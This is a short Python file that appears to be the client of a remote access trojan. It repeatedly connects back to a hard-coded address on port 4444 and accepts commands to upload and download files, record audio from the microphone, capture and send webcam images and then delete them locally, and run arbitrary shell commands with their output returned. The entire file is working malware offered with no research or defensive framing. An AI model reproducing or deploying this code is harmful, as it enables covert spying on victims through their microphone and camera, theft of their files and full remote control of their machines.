import socket
import time
from reverse_shell import reverse_shell
from file_management import upload_file, download_file
from command_execution import execute_command
from audio_recorder import record_audio
from webcam_capture import capture_webcam
import os

def connect_to_server(host, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            print("Connected to the server.")
            return s
        except Exception as e:
            print(f"Connection failed: {e}. Retrying in 5 seconds...")
            time.sleep(5)

def handle_commands(s):
    while True:
        try:
            command = s.recv(1024).decode("utf-8")
            if not command:
                print("Connection lost. Reconnecting...")
                return False

            if command.lower() == "exit":
                break
            elif command.startswith("upload"):
                _, file_path = command.split()
                upload_file(s, file_path)
            elif command.startswith("download"):
                _, file_path = command.split()
                download_file(s, file_path)
            elif command.startswith("record_audio"):
                _, output_file, duration = command.split()
                record_audio(output_file, int(duration))
            elif command.startswith("capture_webcam"):
                parts = command.split()
                if len(parts) == 3:
                    _, output_file, camera_index = parts
                    print(f"Received command to capture webcam: output_file={output_file}, camera_index={camera_index}")
                    capture_path = capture_webcam(output_file, int(camera_index))
                    if capture_path:
                        s.send(f"Captured image saved at {capture_path}".encode("utf-8"))
                        with open(capture_path, 'rb') as f:
                            while True:
                                data = f.read(1024)
                                if not data:
                                    break
                                s.send(data)
                        os.remove(capture_path)
                    else:
                        s.send("Failed to capture image from webcam".encode("utf-8"))
                else:
                    s.send("Invalid command format. Usage: capture_webcam <output_file> <camera_index>".encode("utf-8"))
            else:
                output = execute_command(command)
                s.send(output.stdout.encode("utf-8") + output.stderr.encode("utf-8"))
        except Exception as e:
            print(f"Error handling command: {e}. Reconnecting...")
            return False
    return True

def main():
    host = "192.168.1.20"
    port = 4444

    while True:
        s = connect_to_server(host, port)
        if handle_commands(s):
            print("Connection closed by server.")
        s.close()

if __name__ == "__main__":
    main()
